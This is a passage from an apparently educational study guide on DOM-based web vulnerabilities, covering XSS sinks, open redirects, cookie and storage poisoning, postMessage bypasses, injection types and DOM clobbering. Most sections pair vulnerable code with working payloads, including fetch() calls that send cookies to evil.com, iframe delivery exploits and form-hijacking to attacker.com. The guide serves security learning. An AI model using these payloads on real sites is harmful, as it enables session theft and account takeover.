// onerror fires → alert! 💥
// Server access log shows: GET /page HTTP/1.1
// → Server sees nothing suspicious!
```

---

### 🔴 **Sink 4 - eval()**

```
// Vulnerable code:
var data = location.search.split('callback=')[1];
eval(data);
// OR:
var cmd = location.hash.slice(1);
eval(cmd);

// Payload — steals cookies:
?callback=alert(document.cookie)
// OR (via hash):
#fetch('https://evil.com/?c='+document.cookie)

// More dangerous payload — persistent backdoor:
#setInterval(function(){fetch('https://evil.com/?k='+document.cookie)},1000)
// → Sends cookies to attacker every second!
```

---

### 🔴 **Sink 5 - jQuery .attr() with javascript**

```r
// Vulnerable code (directly from PortSwigger):
$(function() {
    $('#backLink').attr("href",
        (new URLSearchParams(window.location.search)).get('returnUrl'));
});
// Renders: <a id="backLink" href="USER_INPUT">Back</a>

// Payload — javascript: URI:
?returnUrl=javascript:alert(document.domain)
// Renders: <a id="backLink" href="javascript:alert(document.domain)">Back</a>
// When user clicks "Back" → alert fires! 💥

// This is called a "javascript: URL XSS" and requires user to click the link
// Can be weaponized with social engineering
```

---

### 🔴 **Sink 6 - jQuery $() selector with hashchange**

```HTML
// Vulnerable code (from PortSwigger):
$(window).on('hashchange', function() {
    var element = $(location.hash);   // ← if hash starts with < → creates HTML
    element[0].scrollIntoView();
});

// Normal intent: user scrolls to element with that ID
// But: if hash starts with "<" → jQuery creates HTML from it!

// Payload via URL hash:
https://victim.com#<img src=1 onerror=alert(1)>

// jQuery: $(location.hash) = $('<img src=1 onerror=alert(1)>')
// → jQuery creates the img element
// → onerror fires because src=1 fails → alert! 💥

// Delivery via iframe (hashchange requires navigation):
<iframe src="https://victim.com#"
        onload="this.src+='<img src=1 onerror=alert(1)>'">
// First load: victim.com# loads (empty hash, hashchange fires once)
// onload: adds payload to hash → hashchange fires again
// jQuery receives hash with payload → creates img → onerror → XSS!
```

---

### 🔴 **Sink 7 - AngularJS Template Injection (ng-app)**

```r
<!-- Vulnerable page has ng-app attribute: -->
<html ng-app>
  <body>
    <p>Your search: {{search}}</p>
    <script src="angular.min.js"></script>
    <script>
      // AngularJS processes all {{ }} expressions!
    </script>
  </body>
</html>

<!-- 
AngularJS evaluates expressions inside {{ }}
If user input ends up in {{ }} context → template injection

Payload (no angle brackets needed!):
?q={{constructor.constructor('alert(1)')()}}

OR:
?q={{$on.constructor('alert(1)')()}}

AngularJS processes: constructor.constructor('alert(1)')()
→ Gets the Function constructor → calls it → alert executes! 💥

This bypasses:
✅ Angle bracket filtering (no < > needed!)
✅ Some WAF rules (looks like math/template expression)
-->
```

---

## 🔴 **Reflected DOM XSS (Hybrid Variant)**

```js
Normal DOM XSS = entirely client-side, source is URL

Reflected DOM XSS = server echoes URL data INTO JavaScript:

Server response:
  <script>
    var searchQuery = "shoes";   ← server reflected this from ?q=shoes
    displayResults(searchQuery);  ← function uses it
    function displayResults(q) {
        document.getElementById('results').innerHTML = q;  ← sink!
    }
  </script>

Attack URL: ?q="}; alert(document.cookie); var x={"
Server echoes:
  <script>
    var searchQuery = ""}; alert(document.cookie); var x={"";
    displayResults(searchQuery);  ← breaks out of string context first!
  </script>
  → JavaScript breaks out of string → alert fires! 💥
  → This IS sent to server, but the XSS fires client-side via DOM
```

---

## 🔴 **Stored DOM XSS (Persistence Variant)**

```js
How it works:
  1. App stores user data (comment, profile bio, etc.) in database
  2. Server reads from database and puts data into JavaScript:
     <script>var comment = "USER_STORED_DATA";</script>
  3. Comment JS variable is used in a DOM sink:
     document.getElementById('comments').innerHTML += comment;
  4. Attacker submits: <img src=1 onerror=alert(1)>  as comment
  5. Server stores it, echoes it into JS variable
  6. Client-side DOM writes it to innerHTML → XSS fires for EVERY visitor!

Why it's special:
  → Persistent like stored XSS (fires for all visitors)
  → Client-side like DOM XSS (fires in browser, not server response)
  → The taint origin is the stored data, but execution is in the DOM
```

---

# **9. 🔹 Open Redirection**

---

## 📌 **What is DOM-Based Open Redirection ?**

> Arises when a script writes attacker-controllable data to a **redirect sink**. An attacker constructs a URL that, when visited, **redirects the victim to an arbitrary external URL**. Widely exploited for phishing and OAuth token theft.

---

## 💉 **Classic Exploitation — PortSwigger Example**

```r
// Vulnerable code (exact from PortSwigger):
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}

// Analysis:
// → Reads from location.hash (attacker-controlled source)
// → Checks if it starts with "https:" (weak validation)
// → Assigns directly to location (navigation sink)

// Attack URL:
https://www.innocent-website.com/example/  https://www.evil-user.net
//                                        ↑ starts with https: → passes check!

// Victim visits this URL:
// location.hash = "#https://www.evil-user.net"
// goto = "https://www.evil-user.net" (after slice(1))
// goto.startsWith('https:') = TRUE → validation passes!
// location = "https://www.evil-user.net" → REDIRECT! 💥
// Victim is now on attacker's phishing site, trusting the original URL
```

---

## 💉 **Advanced Open Redirect Payloads**

```r
// Payload 1 — Basic redirect:
https://evil.com

// Payload 2 — javascript: URI (code execution, not just redirect!):
?next=javascript:alert(document.cookie)
location.href = location.search.split('next=')[1]
// → Executes JavaScript instead of navigating! Much worse than redirect!

// Payload 3 — Protocol-relative URL:
?url=//evil.com
// → Inherits current protocol (http:// or https://)
// → //evil.com = https://evil.com

// Payload 4 — Data URI (if not filtered):
?url=data:text/html,<script>alert(1)</script>
// → Can execute script in some older browsers

// Common code patterns to look for:
location = userInput;
location.href = param;
window.location.replace(value);
window.location.assign(value);
var target = getParam('returnUrl');
window.open(target);
element.srcdoc = userInput;

// Example of dangerous URL parameter redirect:
var returnUrl = new URLSearchParams(location.search).get('returnUrl');
if (returnUrl) location.href = returnUrl;
// → With no validation → attacker passes any URL!
```

---

## 🛡️ **Impact of Open Redirect**

```r
🎣 Phishing:
  → URL looks legitimate: https://bank.com/login?next=https://evil.com
  → User trusts the bank.com domain
  → After "login" they're redirected to evil.com/fake-login
  → Victim enters credentials on fake page → stolen!

🔑 OAuth Token Theft:
  → OAuth flow: https://auth.com/authorize?redirect_uri=...
  → If redirect_uri contains open redirect to attacker's site
  → Auth tokens/codes are redirected to attacker's server!
  → Full account takeover!

📦 Malware Distribution:
  → Redirect from trusted site to malware download page
  → Users trust they started on a legitimate site

🛡️ WAF/Filter Bypass:
  → Open redirect used as intermediate step in larger attack chain
  → Helps bypass SSRF protections, CSP, etc.
```

---

# **10. 🔹 Cookie Manipulation**

---

## 📌 **What is DOM-Based Cookie Manipulation ?**

> Arises when a script writes attacker-controllable data to `document.cookie`. Can lead to **session fixation** (attacker sets a known session ID), stored DOM XSS (malicious payload stored in cookie, read later), and other session-based attacks.

---

## 💉 **Exploitation**

```R
// Vulnerable code Pattern 1 — direct cookie write from URL:
document.cookie = 'theme=' + location.hash.slice(1);
// URL: site.com#dark
// Cookie: theme=dark ← normal
// Attack: site.com#<img src=1 onerror=alert(1)>
// Cookie: theme=<img src=1 onerror=alert(1)>
// If another page reads theme cookie and puts it in innerHTML → XSS!

// Vulnerable code Pattern 2 — Session Fixation:
document.cookie = 'lastPage=' + location.search.split('=')[1];
// Attack: site.com/?lastPage=; sessionid=ATTACKER_SESSION_ID
// Cookie becomes: "lastPage=; sessionid=ATTACKER_SESSION_ID"
// → Cookie parsing splits on ";", so now sessionid is set to attacker's value!
// → Session fixation: attacker knows victim's session ID
// → Victim logs in → attacker's session becomes authenticated!

// Vulnerable code Pattern 3 — Chained to Stored DOM XSS:
// Step 1: App writes URL parameter to cookie
document.cookie = 'userPref=' + location.search.split('pref=')[1];
// Step 2: Another page reads cookie and renders it:
var savedPref = getCookie('userPref');
document.getElementById('pref').innerHTML = savedPref;  // ← SINK!
// Attack:
// Step 1: Visit: site.com/?pref=<img src=1 onerror=alert(1)>
// Step 2: Cookie set with XSS payload
// Step 3: Visit ANY page that reads 'userPref' cookie → XSS fires!
// The payload is STORED in the cookie → persists across page loads!
```

---

## 💉 **PortSwigger's iframe Delivery Technique**

```r
<!-- This technique chains cookie setting + page reload into one iframe: -->
<iframe src="https://site.com/product?productId=1&'><script>alert(document.cookie)</script>"
        onload="if(!window.x)this.src='https://site.com';window.x=1;">

<!-- What happens:
Step 1: iframe loads first URL (with XSS payload as product param)
        → App writes productId value to a cookie
        → Cookie is now: productId=1&'><script>alert(document.cookie)</script>

Step 2: onload fires → changes iframe src to the main site
        → Main site loads and reads the cookie
        → Cookie is reflected into innerHTML
        → <script> executes → alert fires! 💥

Why this works:
→ onload uses window.x flag to prevent infinite reload loop
→ First load sets the poisoned cookie
→ Second load triggers the XSS from the stored cookie
-->
```

---

# **11. 🔹 JavaScript Injection**

---

## 📌 **What is DOM-Based JavaScript Injection ?**

> Arises when a script executes attacker-controllable data **directly as JavaScript** via sinks like `eval()`, `setTimeout()` with a string, or the `Function()` constructor. An attacker can execute **any JavaScript code** in the victim's browser context.

---

## 💉 **Full Exploitation Examples**

```r
// ─────────────────────────────────────────────────────────────
// 1. eval() sink — direct code execution:
var data = location.search.split('?callback=')[1];
eval(data);

// Payload: site.com/?callback=alert(document.cookie)
// eval("alert(document.cookie)") → fires instantly! 💥
// More impactful payload:
// ?callback=fetch('https://evil.com/?c='+document.cookie)

// ─────────────────────────────────────────────────────────────
// 2. setTimeout with string argument:
var cmd = location.hash.slice(1);
setTimeout(cmd, 100);
// Payload: site.com/#alert(1)
// setTimeout("alert(1)", 100) → executes after 100ms 💥

// ─────────────────────────────────────────────────────────────
// 3. setInterval with string argument:
var interval = location.search.split('cmd=')[1];
setInterval(interval, 2000);
// Payload: ?cmd=sendData(localStorage)
// Executes every 2 seconds → persistent data exfiltration! 💥

// ─────────────────────────────────────────────────────────────
// 4. Function() constructor:
var fn = new Function(location.search.split('code=')[1]);
fn();
// Payload: ?code=alert(document.domain)
// new Function("alert(document.domain)")() → 💥

// ─────────────────────────────────────────────────────────────
// 5. JSONP callback injection (common in API endpoints):
var callback = location.search.split('callback=')[1];
// Server responds with: CALLBACK_VALUE({"data":"result"})
// If callback is reflected in script tag response:
// ?callback=alert(document.cookie)
// Script contains: alert(document.cookie)({"data":"result"}) → 💥
```

---

## ⚠️ **The setTimeout/setInterval String Trap**

```r
// SAFE (function argument):
setTimeout(function() { doSomething(); }, 100);
// → No injection possible — it's a function, not a string

// DANGEROUS (string argument):
setTimeout("doSomething()", 100);
// → Equivalent to eval("doSomething()")
// → If the string contains user input → code injection!

// Pattern to look for:
var action = getParam('action');
setTimeout(action, 500);   // ← DANGER! action is user-controlled
```

---

# **12. 🔹 Document-Domain Manipulation**

---

## 📌 **What is Document-Domain Manipulation ?**

> Arises when a script uses attacker-controllable data to set `document.domain`. This property allows same-origin policy relaxation between subdomains. Attackers can use this to **weaken cross-origin boundaries** and potentially read data across subdomains.

---

## 💉 **Exploitation**

```r
// Legitimate use — two subdomains communicating:
// sub1.example.com sets: document.domain = "example.com"
// sub2.example.com sets: document.domain = "example.com"
// → Now sub1 can read sub2's DOM (intentional)

// Vulnerable code:
var domain = location.search.split('domain=')[1];
document.domain = domain;
// Attack: site.com/?domain=example.com
// → If attacker also controls another page at example.com
//   → They can now read victim's DOM!
// → Weakened same-origin → potential data theft

// Why it's risky even with "safe" values:
// document.domain can only be set to the current domain
// OR a parent domain (sub1.example.com → example.com)
// Attacker can't set it to evil.com from example.com
// BUT: setting it to a parent domain opens subdomain pivoting!
```

---

# **13. 🔹 WebSocket-URL Poisoning**

---

## 📌 **What is WebSocket-URL Poisoning ?**

> Arises when a script uses attacker-controllable data as the **target URL of a WebSocket connection**. The attacker can make the browser connect to a WebSocket server they control, and receive all data the application sends over that connection.

---

## 💉 **Exploitation**

```r
// Vulnerable code:
var wsUrl = location.hash.slice(1);
var ws = new WebSocket(wsUrl);

ws.onopen = function() {
    ws.send(JSON.stringify({
        type: 'auth',
        token: authToken,    // ← Sends token to wherever wsUrl points!
        user: currentUser
    }));
};

ws.onmessage = function(msg) {
    processData(JSON.parse(msg.data));
};

// Attack URL:
site.com#wss://attacker.com/websocket-collector

// What happens:
// WebSocket connects to ATTACKER's server (not legitimate server!)
// App sends authentication token + user data to attacker
// Attacker captures everything → session hijacking! 💥

// Real targets for WebSocket poisoning:
// → Live trading/financial data (price feeds)
// → Real-time chat messages (content theft)
// → Authentication tokens sent on connect
// → Notification systems (leak which events trigger)
// → Collaborative editing tools (document content)

// Additional attack: sending malicious server data to app:
// If app processes WebSocket messages and puts them in DOM
// → Attacker sends XSS payload via WebSocket → app renders it!
```

---

# **14. 🔹 Link Manipulation**

---

## 📌 **What is DOM-Based Link Manipulation ?**

> Arises when a script writes attacker-controllable data to **navigation targets** like link `href` attributes or form `action` attributes. The attacker can cause redirects, steal credentials, or execute code.

---

## 💉 **Exploitation**


```r
// Attack 1 — javascript: URI via href:
var returnUrl = location.search.split('returnUrl=')[1];
document.getElementById('backBtn').href = returnUrl;
// Renders: <a id="backBtn" href="USER_INPUT">Back</a>

// Payload: ?returnUrl=javascript:alert(document.domain)
// Renders: <a href="javascript:alert(document.domain)">Back</a>
// When victim clicks "Back" → JS executes! 💥
// Social engineering required → but on a trusted site, users click!

// Attack 2 — Form action hijacking:
var submitUrl = location.hash.slice(1);
document.querySelector('form').action = submitUrl;
// Renders: <form action="USER_INPUT">

// Payload: #https://attacker.com/steal
// Renders: <form action="https://attacker.com/steal">
// When victim submits the form → credentials go to attacker! 💥
// Perfect for login form hijacking!

// Attack 3 — Link href redirect:
var nextPage = document.cookie.split('next=')[1];
document.getElementById('next').href = nextPage;
// Chain with cookie manipulation → cookie poisons href!

// Attack 4 — Image source manipulation (indirect):
var avatar = location.search.split('avatar=')[1];
document.getElementById('userAvatar').src = avatar;
// Payload: ?avatar=https://evil.com/track.png
// → Makes user's browser request attacker's server
// → Leaks: IP, timing, browser fingerprint, referrer
```

---

# **15. 🔹 Web Message Manipulation**

---

## 📌 **What is DOM-Based Web Message Manipulation ?**

> Arises when a script sends attacker-controllable data as a **web message to another document** via `postMessage()`. The recipient processes the message unsafely.

---

## 💉 **Exploitation**

```r
// Vulnerable sender (sends message with wildcard target "*"):
var data = location.search.split('msg=')[1];
someIframe.contentWindow.postMessage(data, '*');
// → Any domain can observe this message if they iframe this page
// → Attacker iframes it and receives the sensitive data!

// Vulnerable receiver (no origin check):
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
    // ← No origin check!
    // ← innerHTML as sink!
    // → Send any HTML from any domain → XSS!
});

// Attack from attacker.com:
<iframe src="//victim.com"
        onload="this.contentWindow.postMessage(
            '<img src=1 onerror=print()>',
            '*'
        )">
// Iframe loads victim.com
// onload sends malicious message
// victim.com's handler puts e.data into innerHTML
// XSS fires on victim.com! 💥
```

---

# **16. 🔹 Ajax Request-Header Manipulation**

---

## 📌 **What is Ajax Request-Header Manipulation ?**

> Arises when a script writes attacker-controllable data to the **request headers of an outgoing Ajax request**. This can be used to bypass access controls, inject extra headers, or redirect the request to an attacker's server.

---

## 💉 **Exploitation**

```r
// Attack 1 — Header injection via setRequestHeader:
var customHeader = location.search.split('header=')[1];
var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/sensitive-data');
xhr.setRequestHeader('X-Custom', customHeader);
xhr.send();

// Payload: ?header=legitimate\r\nX-Admin: true
// Injects a second header into the request
// If server grants admin access based on X-Admin: true → bypass!
// (Modern browsers block \r\n injection but test for it)

// Attack 2 — Open URL in XMLHttpRequest (SSRF-like):
var apiUrl = location.hash.slice(1);
var xhr = new XMLHttpRequest();
xhr.open('GET', apiUrl);
xhr.send();
// Payload: #https://attacker.com/collect?data=...
// Browser makes an Ajax request to attacker's server
// Can exfiltrate data if the response is processed

// Attack 3 — jQuery globalEval:
var code = e.data;  // from postMessage
$.globalEval(code);
// → Equivalent to eval() in jQuery
// → Direct code execution
```

---

# **17. 🔹 Local File-Path Manipulation**

---

## 📌 **What is DOM-Based Local File-Path Manipulation ?**

> Arises when a script passes attacker-controllable data to a **file handling API**. An attacker may cause the browser to open or write arbitrary local files.

---

## 💉 **Exploitation**

```r
// Vulnerable code:
var filename = location.search.split('file=')[1];
var reader = new FileReader();
reader.readAsText(new Blob([filename]));  // ← uses attacker data

// OR: controlled file input fed into reader:
reader.onload = function(e) {
    // File contents go into a dangerous sink:
    document.getElementById('preview').innerHTML = e.target.result;
    // If file contains: <img src=1 onerror=alert(1)>
    // → innerHTML renders it → XSS fires from local file! 💥
};

// Impact:
// → Read arbitrary local files the browser has access to
// → If result is used in innerHTML → XSS from file contents
// → Exfiltrate local file data to attacker's server

// Available sinks:
FileReader.readAsText()       // Read as text string
FileReader.readAsDataURL()    // Read as base64 data URL
FileReader.readAsArrayBuffer() // Read as raw bytes
FileReader.readAsBinaryString() // Read as binary string
```

---

# **18. 🔹 Client-Side SQL Injection**

---

## 📌 **What is Client-Side SQL Injection ?**

> Arises when a script incorporates attacker-controllable data into a **client-side SQL query** (using the Web SQL Database API) without proper escaping. The attacker can manipulate queries to extract or modify data.

---

## 💉 **Exploitation**

```r
// Vulnerable code:
var searchTerm = location.search.split('q=')[1];
db.transaction(function(tx) {
    tx.executeSql(
        'SELECT * FROM products WHERE name = "' + searchTerm + '"',
        [],
        function(tx, results) {
            displayResults(results);
        }
    );
});

// Normal: ?q=shoes
// SQL: SELECT * FROM products WHERE name = "shoes"

// Attack: ?q=" OR "1"="1
// SQL: SELECT * FROM products WHERE name = "" OR "1"="1"
// → Returns ALL products! → Data exposure 💥

// Attack 2 — Extract all data:
// ?q=" OR 1=1--
// SQL: SELECT * FROM products WHERE name = "" OR 1=1--"
// → 1=1 is always true → dumps entire table!

// Attack 3 — Authentication bypass:
// ?username=admin" --
// SQL: SELECT * FROM users WHERE username = "admin" --"
// → Everything after -- is a comment → bypasses password check!

// Note: Web SQL Database (executeSQL) is deprecated in modern browsers
// but legacy applications may still use it
```

---

# **19. 🔹 HTML5-Storage Manipulation**

---

## 📌 **What is HTML5-Storage Manipulation ?**

> Arises when a script stores attacker-controllable data in browser storage (`localStorage` or `sessionStorage`) without sanitization. If that data is later read back and put into a dangerous sink, it creates a **Stored DOM XSS** — persistent across page reloads.

---

## 💉 **Exploitation**

```r
// Step 1 — Poisoning the storage:
var theme = location.search.split('theme=')[1];
localStorage.setItem('userPreference', theme);
// Attack: ?theme=<img src=1 onerror=alert(1)>
// localStorage now contains: {"userPreference": "<img src=1 onerror=alert(1)>"}

// Step 2 — Later page reads from storage and uses it dangerously:
// (Different page load — maybe even next browser session!)
window.onload = function() {
    var savedTheme = localStorage.getItem('userPreference');
    document.getElementById('content').innerHTML = savedTheme;
    // ← innerHTML + malicious data = XSS! 💥
};

// Why this is extra dangerous:
// ✅ Attack persists across page reloads
// ✅ Attack persists across browser tabs
// ✅ Attack persists until localStorage is cleared
// ✅ Original poisoning URL doesn't need to be active anymore!

// Real-world scenario:
// 1. Attacker sends victim: https://site.com/?theme=<xss-payload>
// 2. Victim visits → payload stored in localStorage
// 3. Victim closes browser, opens it next week
// 4. Visits site.com → localStorage read → XSS fires!
// 5. Attacker has long moved on — XSS is "self-sustaining"!

// sessionStorage variant (same concept, shorter persistence):
var session_data = location.search.split('data=')[1];
sessionStorage.setItem('tempData', session_data);
// Same XSS risk, but only lasts for the current browser session
```

---

# **20. 🔹 Client-Side XPath Injection**

---

## 📌 **What is Client-Side XPath Injection ?**

> Arises when a script incorporates attacker-controllable data into an **XPath query** used to navigate XML data stored client-side. The attacker can modify the query to extract unintended data.

---

## 💉 **Exploitation**

```r
// Vulnerable code — querying local XML data:
var username = location.search.split('user=')[1];
var result = document.evaluate(
    '/users/user[name="' + username + '"]/data',
    xmlDocument,
    null,
    XPathResult.STRING_TYPE,
    null
);
// Normal: ?user=alice → /users/user[name="alice"]/data
// Returns: alice's data only ✅

// Attack 1 — OR injection (returns all users!):
// ?user=" or "1"="1
// XPath: /users/user[name="" or "1"="1"]/data
// → Returns ALL users' data! 💥

// Attack 2 — Blind XPath extraction (character by character):
// ?user=" or starts-with(name,'a')="true" and "x"="x
// XPath: /users/user[name="" or starts-with(name,'a')="true" and "x"="x"]/data
// → If page shows data: first user starts with 'a'
// → Use binary search to extract all data!

// Attack 3 — Complete data dump:
// ?user='] | //* | user[name='x
// XPath: /users/user[name="'] | //* | user[name='x"]/data
// → Returns ALL nodes from the XML document!
```

---

# **21. 🔹 Client-Side JSON Injection**

---

## 📌 **What is Client-Side JSON Injection ?**

> Arises when a script incorporates attacker-controllable data into a **JSON string that is then parsed**, and the parsed object is used to drive application logic. The attacker can add or overwrite properties in the parsed object.

---

## 💉 **Exploitation**

```r
// Vulnerable code:
var userInput = location.hash.slice(1);  // reads from URL hash
var config = JSON.parse('{"username":"' + userInput + '","role":"user"}');
if (config.role === 'admin') {
    showAdminPanel();
}

// Normal: #alice
// JSON: {"username":"alice","role":"user"}
// config.role = "user" → no admin panel ✅

// Attack — inject extra property:
// #alice","role":"admin"}//
// JSON.parse: {"username":"alice","role":"admin"}//"","role":"user"}
// ← The // makes rest a comment... wait, JSON doesn't have comments
// ACTUALLY: the " closes the string, , separates, "role":"admin"} closes the object
// Result: config.role = "admin" → showAdminPanel() called! 💥

// Attack 2 — Override any property:
// #alice","isLoggedIn":true}//
// Makes app think user is logged in!

// Attack 3 — null injection:
// #","password":null,"username":"alice
// May bypass password validation

// Real-world target: JSONP endpoints:
// /api/data?callback=userFunction
// Response: userFunction({"data":"result"})
// If callback is reflected without sanitization:
// ?callback=alert(document.cookie)
// Response: alert(document.cookie)({"data":"result"}) → XSS! 💥
```

---

# **22. 🔹 DOM-Data Manipulation**

---

## 📌 **What is DOM-Data Manipulation ?**

> Arises when a script writes attacker-controllable data to **DOM element attributes or properties** that affect visible UI or client-side logic. Can change button text, link destinations, form targets, image sources, etc.

---

## 💉 **Exploitation**

```r
// Attack 1 — setAttribute with javascript: URI:
var linkDest = location.search.split('text=')[1];
document.getElementById('ctaButton').setAttribute('href', linkDest);
// Payload: ?text=javascript:alert(1)
// Renders: <a href="javascript:alert(1)">Click me!</a>
// When user clicks → alert fires! 💥

// Attack 2 — Change button text to manipulate user:
var buttonText = location.search.split('btn=')[1];
document.getElementById('payButton').textContent = buttonText;
// → Attacker changes "Pay $10" to "Pay $0" or other deceptive text
// → User thinks they're paying $0 but actual form submits $10
// → UI deception attack (not XSS, but still dangerous)

// Attack 3 — onChange event attribute injection:
var handler = location.search.split('onchange=')[1];
document.getElementById('input').setAttribute('onchange', handler);
// Payload: ?onchange=alert(document.cookie)
// Renders: <input onchange="alert(document.cookie)">
// When user types → onchange fires → cookie theft!

// Attack 4 — Form action + autocomplete manipulation:
var formDest = location.search.split('dest=')[1];
document.querySelector('form').setAttribute('action', formDest);
// Payload: ?dest=https://evil.com/collect
// Form submits all fields to attacker's server!
```

---

# **23. 🔹 Denial of Service (DOM-Based)**

---

## 📌 **What is DOM-Based Denial of Service ?**

> Arises when a script passes attacker-controllable data to a function that can cause the **browser to crash or significantly slow down**, preventing users from using the application.

---

## 💉 **Exploitation — ReDoS (Regular Expression DoS)**

```r
// Vulnerable code:
var searchPattern = location.search.split('pattern=')[1];
var regex = new RegExp(searchPattern);
var testString = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaX";
regex.test(testString);  // ← Browser hangs if regex causes catastrophic backtracking!

// WHY ReDoS happens — Catastrophic Backtracking:
// Normal regex: /abc/ → processes in O(n) time → fast

// Evil regex: /(a+)+$/ on string "aaaaX"
// → "a" can be consumed as ONE big group: [aaaa]
// → OR as MANY small groups: [a][a][a][a]
// → For each failed match → backtracking tries ALL combinations
// → 4 'a' characters → 2^4 = 16 combinations to try
// → 20 'a' characters → 2^20 = 1 million combinations
// → 30 'a' characters → 2^30 = 1 BILLION combinations
// → Browser tab freezes/crashes in seconds! 💥

// Attack payload:
?pattern=(a+)+$&data=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX
// ↑ This specific regex + input → exponential backtracking

// More evil regex patterns:
(a|aa)+$        // Multiple overlapping alternatives
(a+|b)+$        // Alternatives that can match same input
([a-zA-Z]+)*$   // Nested quantifiers with wide character class

// Impact:
// → Victim browser tab freezes
// → If used in Node.js server-side → server DoS
// → Can crash older browsers entirely
// → Makes the web app appear broken/unavailable

// Other DoS sinks:
requestAnimationFrame(() => { heavyWork(location.search); })
// → If triggers infinite or very fast loop → CPU spike → freeze
```

---

# **24. 🌐 Controlling the Web Message Source (postMessage Deep Dive)**

---

## 📌 **The postMessage API — What It Is**

```js
Browser's Same-Origin Policy (SOP):
  → Normally, pages from different origins CANNOT read each other's DOM
  → site-a.com JavaScript CANNOT read site-b.com data
  → This is a fundamental browser security feature!

postMessage() — The SOP Bridge:
  → Allows INTENTIONAL cross-origin communication
  → Window A sends: window.B.postMessage("hello", "https://site-b.com")
  → Window B receives: addEventListener('message', handler)
  → Controlled communication across origins ✅ when used correctly

The Problem:
  → Many developers implement postMessage WITHOUT proper origin checks
  → This breaks the whole point of SOP
  → Any domain can send malicious messages and they'll be processed!
```

---

## 🔍 **How to Find postMessage Vulnerabilities**

```js
Step 1 — Find all message listeners:
  DevTools → Search all files (Ctrl+Shift+F) for:
  "addEventListener('message'"
  "window.onmessage ="
  "self.onmessage ="
  "addEventListener(\"message\""

Step 2 — For each listener, check:
  ① Origin verification:
     → e.origin !== 'https://trusted.com'  ← SAFE
     → e.origin.indexOf('trusted.com')      ← UNSAFE (bypassable)
     → e.origin.endsWith('trusted.com')     ← UNSAFE (bypassable)
     → e.origin.startsWith('https://trusted') ← UNSAFE (bypassable)
     → No check at all                       ← UNSAFE (any origin!)

  ② What sink does e.data reach?
     eval(e.data)            → Code execution
     innerHTML = e.data      → HTML injection
     location.href = e.data  → Open redirect
     document.cookie = e.data → Cookie manipulation

Step 3 — Burp DOM Invader:
  → Enable DOM Invader → Settings → enable "postMessage interception"
  → DOM Invader shows all postMessage listeners it finds
  → Click "Send probe" to test each one
  → Shows if listener has origin check or not
```

---

## 💉 **Origin Verification Bypass Techniques**

```r
// ─────────────────────────────────────────────────────────────
// 1. No origin check (most common — completely open):
window.addEventListener('message', function(e) {
    eval(e.data);  // accepts from ANY origin, executes anything!
});
// Bypass: no bypass needed — just send your payload directly!

// ─────────────────────────────────────────────────────────────
// 2. indexOf() check — BYPASSABLE:
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('trusted.com') > -1) {
        eval(e.data);
    }
});
// indexOf only checks if string EXISTS ANYWHERE in origin
// Bypass: send from origin that CONTAINS "trusted.com":
//   → http://trusted.com.evil.net      ← trusted.com is IN this string!
//   → https://notmytrusted.com         ← trusted.com is IN this string!
//   → http://evil.com/trusted.com/path ← (URL path, but still)

// ─────────────────────────────────────────────────────────────
// 3. endsWith() check — BYPASSABLE:
if (e.origin.endsWith('trusted.com')) { ... }
// Bypass: use a domain that ENDS WITH trusted.com:
//   → http://evilnotrusted.com         ← ends with "trusted.com"!
//   → https://anythingattrusted.com    ← ends with "trusted.com"!

// ─────────────────────────────────────────────────────────────
// 4. startsWith() check — BYPASSABLE:
if (e.origin.startsWith('https://trusted.com')) { ... }
// Bypass: use a domain that STARTS WITH "https://trusted.com":
//   → https://trusted.com.evil.net     ← starts with that string!
//   → https://trusted.com/anypath      ← (not a valid origin but...)

// ─────────────────────────────────────────────────────────────
// 5. Regex with dot (.) — BYPASSABLE:
if (e.origin.match(/^https:\/\/trusted\.com$/)) { ... }
// If dots aren't properly escaped, . matches any character:
//   → https://trustedXcom  ← X matches the unescaped dot!
// ← SAFE version: escape the dot: /trusted\.com/

// ─────────────────────────────────────────────────────────────
// 6. null origin bypass (sandbox iframe trick):
// e.origin === 'null' can be set using sandboxed iframes:
// <iframe sandbox="allow-scripts" src="about:blank">
// → Origin is 'null' inside sandboxed iframe
// → If check is: if (e.origin !== 'null') → bypass possible!
// Full exploit:
<iframe sandbox="allow-scripts allow-same-origin"
        srcdoc="<script>parent.postMessage('payload','*')</script>">
// This message's origin = 'null' → bypasses == 'null' checks!

// ─────────────────────────────────────────────────────────────
// ✅ SAFE — Strict equality only:
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://trusted-site.com') return;
    // process message...
});
// CANNOT be bypassed — exact match required!
```

---

## 💉 **Full postMessage Attack Payloads**

```r
<!-- Attack 1: No origin check + innerHTML sink: -->
<iframe src="//victim.com"
        onload="this.contentWindow.postMessage(
            '<img src=1 onerror=print()>',
            '*'
        )">

<!-- Attack 2: No origin check + eval() sink: -->
<iframe src="//victim.com"
        onload="this.contentWindow.postMessage('print()','*')">

<!-- Attack 3: No origin check + JSON-parsed data: -->
<iframe src="//victim.com"
        onload="this.contentWindow.postMessage(
            JSON.stringify({action:'redirect',url:'https://evil.com'}),
            '*'
        )">

<!-- Attack 4: indexOf bypass with crafted domain: -->
<!-- Host attack page at: http://normal-website.com.evil.net -->
<script>
parent.postMessage('alert(document.cookie)', '*');
// e.origin = 'http://normal-website.com.evil.net'
// indexOf('normal-website.com') > -1  ← TRUE! Check bypassed!
</script>
```

---

# **25. 💀 DOM Clobbering — Advanced Technique**

---

## 📌 **What is DOM Clobbering ?**

> DOM clobbering is a technique in which you **inject HTML into a page to manipulate the DOM** and ultimately change the behaviour of JavaScript. It is particularly useful when **XSS is not possible**, but you can control `id` or `name` attributes in HTML.
> 
> The name "clobbering" comes from "overwriting" — you overwrite global JavaScript variables by injecting HTML elements with matching names. — PortSwigger, OWASP, Wikipedia

---

## 🧠 **The Core Browser Quirk That Enables This**

```r
// 🔑 KEY BROWSER BEHAVIOR:
// HTML elements with id= or name= become accessible as window.* properties!

// Inject this HTML:
<img id="logo">

// Now in JavaScript:
window.logo          // → Returns the <img> element
window['logo']       // → Same thing

// This is called "Named Access" — a legacy browser feature
// Dates back to the 1990s web — browsers still support it for compatibility

// The ATTACK:
// Developer writes: var config = window.config || {};
// Attacker injects: <a id="config">
// Now: window.config = <a> element (TRUTHY but not an Object!)
// var config = window.config || {} → returns <a> element, NOT {}!
